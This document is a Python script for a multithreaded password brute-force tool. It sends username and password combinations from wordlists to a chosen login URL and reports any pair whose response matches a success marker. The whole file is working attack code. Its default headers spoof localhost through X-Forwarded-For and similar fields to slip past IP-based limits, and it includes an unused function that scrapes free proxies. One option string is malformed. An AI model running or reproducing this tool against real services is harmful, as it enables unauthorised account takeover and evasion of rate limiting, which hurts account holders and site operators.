import requests
import threading
from bs4 import BeautifulSoup                                                           
import argparse
import json

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml",
    "Cookie": "session=xAxPv4Zwe9rMb9wCLsbOqXI3CVvPzPu5",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Originating-IP": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1"
}

def getIPs():
    response = requests.get("https://sslproxies.org/") 
    soup = BeautifulSoup(response.content, 'html5lib') 
    ips = [ip.text for ip in soup.findAll('td')[::8]]
    ports = [port.text for port in soup.findAll('td')[1::8]]
    IPList = [ips[i]+":" + ports[i] for i in range(len(ips))]
    IPList = [proxy for proxy in IPList if proxy[0].isnumeric()]
    print()
    return IPList

class Bruteforce:

    def __init__(self, url, headers, idList, passList, isPresent, isAbsent):
        self.url = url
        self.headers = headers
        self.idList = idList
        self.passList = passList
        self.isPresent = isPresent
        self.isAbsent = isAbsent

    def sendreq(self, passw, uid):
        res = ""
        try:
            res=requests.post(self.url,data={
                            "username": uid,
                            "password": passw
                            },json={
                            "username": uid,
                            "password": passw
                            }, headers=self.headers).text
        except Exception as e:
            print(e)
            res = ""
        if res and ((self.isPresent and self.isPresent in res) or (self.isAbsent and self.isAbsent not in res)):
            print("uid-",uid)
            print("pass-",passw)

    def bruteforce(self):
        for uid in self.idList:
            T =[]
            for passw in self.passList:
                
                t = threading.Thread(target=self.sendreq, args=(passw, uid))
                t.start()
                T.append(t)
            for t in T:
                t.join()

def readListFiles(fileName):
    with open(fileName, "r") as f:
        items = f.readlines()
        items = [item[:-1] for item in items]
        return items

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-u',
                         action='store',
                         required=True,
                         help='bruteforce url')
    parser.add_argument('--headers-file', '-hf',
                         action='store',
                         required=True,
                         help='The file consisting of all the required headers')
    passwords_group = parser.add_mutually_exclusive_group(required=True)
    passwords_group.add_argument('--password', '  ',
                                 action='store',
                                 help='single password')
    passwords_group.add_argument('--password-file', '-pf',
                                 action='store',
                                 help='path to passwords file')
    ids_group = parser.add_mutually_exclusive_group(required=True)
    ids_group.add_argument('--id', '-i',
                           action='store',
                           help='single id')
    ids_group.add_argument('--id-file', '-if',
                           action='store',
                           help='path to ids file')
    identifier_group = parser.add_mutually_exclusive_group(required=True)
    identifier_group.add_argument('--is-present', '-ip',
                                 action='store',
                                 help='if present in response terminates the bruteforce')
    identifier_group.add_argument('--is-not-present', '-inp',
                                 action='store',
                                 help='value if not present in response terminates the bruteforce')
    options = parser.parse_args()
    
    url = options.url
    with open(options.headers_file, 'r') as f:
        headers = json.loads(f.read())
    passwords = []
    ids = []
    if options.password:
        passwords = [options.password]
    else:
        passwords = readListFiles(options.password_file)
    
    if options.id:
        ids = [options.id]
    else:
        ids = readListFiles(options.id_file)
    isPresent = options.is_present 
    isNotPresent = options.is_not_present
    Bruteforce(url, headers, ids, passwords, isPresent, isNotPresent).bruteforce()



if __name__=="__main__":
    main()
